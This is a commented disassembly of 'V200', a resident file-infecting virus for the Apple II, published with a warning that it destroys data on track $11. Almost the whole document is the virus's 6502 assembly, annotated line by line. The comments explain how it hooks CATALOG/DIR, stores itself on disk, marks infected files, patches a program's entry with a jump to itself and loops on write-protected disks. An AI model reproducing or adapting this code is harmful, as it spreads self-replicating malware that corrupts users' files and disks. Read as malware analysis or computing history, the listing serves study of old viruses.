        Virus V200 for APPLE ][ or compatible.

                Author : Rosen Dimitrov
           Disasembled : John Petrov Petrov


        This virus infect when you start an infected file or when you use
    CATALOG or DIR comand and infect ONLY ONE FILE. It is a resident virus.


        WARNING : ALL YOR DATA ON TRACK $11, SECTOR $01 AND SECTOR $02 WILL
                  BE LOST! AN INFECTED FILES CAN'T BE COPIED BECAUSE WILL BE
                  LOST AN ORIGINAL 3 BYTES THAT ARE IN TRACK/SECTOR LIST AT 
                  OFFSET $07,$08,$09.


                Meanings:

        HBAP -> Hight Byte Adress of Program;
        LBAP -> Low Byte Adress of Program;
        HBLP -> Hight Byte Length of Program;
        LBLP -> Low Byte length of Program;
        HBAV -> Hight Byte Adress of Virus;
        LBAV -> Low Byte Adress of Virus;
        HBLV -> Hight Byte Length of Virus;
        LBLV -> Low Byte length of Virus;


                LDA     $AA72   ; Find the load adress of program in memory.
                STA     $EB     ; $EB = LBAP
                LDA     $AA73   ; $EC = HBAP
                STA     $EC     ;

                CLC             ; Find the adress of its subroutine that call
                LDY     #$01    ; the RWTS.
                LDA     ($EB),Y ; $ED = LBAV
                STA     $ED     ; $F9 = LBAV + #$DD
                ADC     #$DD    ; $EE = HBAV
                STA     $F9     ; $FA = HBAV + #$01
                INY             ;
                LDA     ($EB),Y ;
                STA     $EE     ;
                ADC     #$01    ;
                STA     $FA     ;

                LDA     $ED     ; Make the part from offset 30 (hex) to the end
                ADC     #$30    ; of program resident /when you call CATALOG or
                STA     ADA9    ; DIR/.
                LDA     $EE     ; $ADA9 - $ADAA -> Adress of VTOC read/write
                ADC     #$00    ; function.
                STA     $ADAA   ; $ADA9 = LBAV + #$30
                STA     $E3     ; $ADAA = HBAV + #$00
                                ; $E3 = HBAV + #$00

                BCC     OFS_034 ;

        OFS_030 LDA     #$00    ; Virus was activated by CATALOG or DIR.
                STA     $E3     ;

        OFS_034 LDY     #$20    ; Move its subroutine that call RWTS from the
        OFS_036 LDA     ($F9),Y ; end of virus to $02DD adress. This is in the
                STA     $02DC,Y ; keyboard buffer.
                DEY             ; 
                BNE     OFS_036 ; 

                STY     $B7EB   ; Read from TRACK 11, SECTOR 03 with VOLUME 00.
                LDX     #$BB    ; That mean to read with any volume.
                STX     $B7F0   ; Buffer is $B4BB
                STX     $CE     ;
                LDX     #$B4    ;
                STX     $B7F1   ;
                STX     $CF     ;
                LDX     #$11    ;
                STX     $B7EC   ;
                LDX     #$03    ;
                STX     $B7ED   ;
                LDX     #$01    ;
                STX     $B7F4   ;
                JSR     $02DD   ; Go to its subroutine that call the RWTS.

                LDA     ($CE),Y ; Check if at offset $00 at TRACK 11, SECTOR 03
                CMP     #$19    ; is $19 then the disk is IMUNIZED and there is
                BNE     OFS_06A ; NOTHING to do
                JMP     $FA62   ; and call RESET subroutine. That mean that if
                                ; the disk is IMUNIZED and virus is resident 
                                ; you never can use CATALOG or DIR function.

        OFS_06A CMP     #$56    ; Check if at offset $00 at TRACK 11, SECTOR 03
                BEQ     OFS_099 ; is $56 then the virus code is on the disk at
                                ; TRACK 11, SECTOR 3-1.

                LDA     #$56    ; Put $56,$00,$00 at TRACK 11, SECTOR 03 and 
                STA     ($CE),Y ; write this sector on the disk. Make this 
                STY     $B4BC   ; sector last for the catalog.
                STY     $B4BD   ; 
                INC     $B7F4   ;
                JSR     $02DD   ;

                LDA     $ED     ; Take the first part of virus code /just on
                STA     $B7F0   ; the end of BLOADED program/ and write it at
                LDA     $EE     ; TRACK 11, SCETOR 02.
                STA     $B7F1   ;
                DEC     $B7ED   ;
                JSR     $02DD   ;

                INC     $B7F1   ; Take the second part of virus code /just on
                DEC     $B7ED   ; the end of previos part/ and write it at
                JSR     $02DD   ; TRACK 11, SECTOR 01.

                BNE     OFS_034 ; Trying until success. If the disk is with
                                ; protect tab then the virus trying to write
                                ; on the disk until you remove the protect tab
                                ; or press the RESET key.

        OFS_099 STX     $B7F4   ; Read the catalog track starting with
                LDX     #$0F    ; SECTOR 0F, ending with SECTOR 03.
        OFS_09E STX     $B7ED   ; BUFFER $B4BB
                JSR     $02DD   ;

                LDA     #$03    ; $D6 = #$03
                STA     $D6     ;

                LDY     #$0D    ;

        OFS_0AA LDA     ($CE),Y ; Is this a B type file?
                AND     #$7F    ;
                CMP     #$04    ;
                BNE     OFS_0CC ; No.

                STY     $D7     ; Is this a DELETED file?
                DEY             ;
                DEY             ;
                LDA     ($CE),Y ;
                CMP     #$FF    ;
                BEQ     OFS_0CA ; Yes.

                LDY     $D6     ; Is this an INFECTED file?
                LDA     ($CE),Y ; There is 7 files in each sector, and there is
                CMP     #$49    ; 8 empty bytes at offset $03.
                                ; If offset $03 = #$49 then the 1 file is in-
                                ; fected.
                                ; If offset $04 = #$49 then the 2 file is in-
                                ; fected.
                                ; and etc.
                BEQ     OFS_0CA ; Yes.

                LDA     #$49    ; Put in offset curent that the file is
                STA     ($CE),Y ; INFECTED.
                BNE     OFS_0D5 ; This never can be 0.

        OFS_0CA LDY     $D7     ; Continue with next file from the same sector.
        OFS_0CC INC     $D6     ;
                TYA             ;
                CLC             ;
                ADC     #$23    ;
                TAY             ;
                BCC     OFS_0AA ; If there are no more files in this sector.

        OFS_0D5 CMP     #$49    ; Check the "infect" sign.
                BEQ     OFS_0E0 ; No sign.

                DEX             ; Check is there any sectors from catalog track
                CPX     #$02    ; to read.
                BNE     OFS_09E ; Yes.
                BEQ     OFS_154 ; No.

        OFS_0E0 INC     $B7F4   ; Write the CURENT catalog sector.
                JSR     $02DD   ;

                DEC     $B7F4   ; Read the curent file track/sector list.
                LDY     $D7     ; Take the adress from catalog sector.
                DEY             ;
                DEY             ;
                LDA     ($CE),Y ;
                STA     $B7EC   ;
                INY             ;
                LDA     ($CE),Y ;
                STA     $B7ED   ;
                JSR     $02DD   ;

                LDY     #$0C    ; Take the adress of start track and sector of
                LDA     ($CE),Y ; file
                STA     $D6     ; TRACK -> $D6
                INY             ; SECTOR -> $D7
                LDA     ($CE),Y ;
                STA     $D7     ;

        OFS_106 LDY     #$01    ; Check is the file track/sector list is
                LDA     ($CE),Y ; more then 1 sector.
                BNE     OFS_112 ;
                INY             ; Yes.
                LDA     ($CE),Y ;
                BEQ     OFS_123 ; No.

                DEY             ;

        OFS_112 LDA     ($CE),Y ; Read next file track/sector list.
                STA     $B7EC   ;
                INY             ;
                LDA     ($CE),Y ;
                STA     $B7ED   ;
                JSR     $02DD   ;

                CLC             ; Go to check again.
                BCC     OFS_106 ;

        OFS_123 LDY     #$0A    ; Try to find an empty track/sector in curent
        OFS_125 INY             ; track/sector list.
        OFS_126 INY             ;
                BEQ     OFS_154 ;
                LDA     ($CE),Y ;
                BNE     OFS_125 ;
                INY             ;
                LDA     ($CE),Y ;
                BNE     OFS_126 ;
                CPY     #$FC    ;
                BCS     OFS_154 ;

                DEY             ; The empty track/sector was found.
                LDA     #$11    ; Add : /its self at the end of file/
                STA     ($CE),Y ;
                INY             ;       11 02 11 01 00 00
                LDA     #$02    ;
                STA     ($CE),Y ;
                INY             ;
                LDA     #$11    ;
                STA     ($CE),Y ;
                INY             ;
                LDA     #$01    ;
                STA     ($CE),Y ;
                INY             ;
                LDA     #$00    ;
                STA     ($CE),Y ;
                INY             ;
                STA     ($CE),Y ;
                BCC     OFS_157 ;

        OFS_154 CLC             ;
                BCC     OFS_1C1 ;

        OFS_157 LDY     $D6     ; Read the first sector from file in
                LDA     $B7EC   ; BUFFER $B3BB
                STA     $D6     ;
                STY     $B7EC   ;
                LDY     $D7     ;
                LDA     $B7ED   ;
                STA     $D7     ;
                STY     $B7ED   ;
                DEC     $B7F1   ;
                JSR     $02DD   ;

                LDY     #$07    ; Move the first 3 original bytes of program
                LDA     $B3BF   ; /offset $05,$06,$07/ at offset $07,$08,$09 in
                STA     ($CE),Y ; file track/sector list.
                INY             ; There is 8 free bytes from offset $07.
                LDA     $B3C0   ;
                STA     ($CE),Y ;
                INY             ;
                LDA     $B3C1   ;
                STA     ($CE),Y ;

                LDA     #$4C    ; Move to offset $05 in the program $4C (JMP)
                STA     $B3BF   ;
                LDA     #$FC    ; Move to offset $03 /LBLP/ in the program $FC
                STA     $B3BD   ;
                ADC     $B3BB   ; Find the adress of virus an put it to offset
                STA     $B3C0   ; $06,$07
                LDA     $B3BC   ;
                ADC     $B3BE   ; HBAV = HBAP + HBLV
                STA     $B3C1   ;

                CMP     #$08    ; Load adress of the virus is less then $0800
                BCC     OFS_1C1 ; Yes.

                CMP     #$94    ; Load adress of the virus is higer then $9400
                BCS     OFS_1C1 ; Yes.

                INC     $B3BE   ; Write changes in first sector of file.
                INC     $B3BE   ;
                INC     $B7F4   ;
                JSR     $02DD   ;

                INC     $B7F1   ; Write changes in file track/sector list.
                LDA     $D6     ;
                STA     $B7EC   ;
                LDA     $D7     ;
                STA     $B7ED   ;
                JSR     $02DD   ;

        OFS_1C1 LDA     $E3     ; The virus was activated by program.
                BNE     OFS_1C8 ;
                JMP     $AFF7   ; The virus was activated by CATALOG or DIR
                                ; Call VTOC function.

        OFS_1C8 LDY     #$00    ; Find the original 3 bytes of file.
                LDA     $9707   ; Put them on their places.
                STA     ($EB),Y ;
                INY             ;
                LDA     $9708   ;
                STA     ($EB),Y ;
                INY             ;
                LDA     $9709   ;
                STA     ($EB),Y ;

                JMP     ($AA72) ; JMP to programs begin.

                PHP             ; Its subroutine for calling RWTS.
                PHA             ;
                TYA             ;
                PHA             ;
                TXA             ;
                PHA             ;
                LDA     $BCC3   ;
                PHA             ;
                LDA     #$BD    ;
                STA     $BCC3   ;
                JSR     $03E3   ;
                JSR     $03D9   ;
                PLA             ;
                STA     $BCC3   ;
                PLA             ;
                TAX             ;
                PLA             ;
                TAY             ;
                PLA             ;
                PLP             ;
                RTS             ;

        Sorry for bad English.
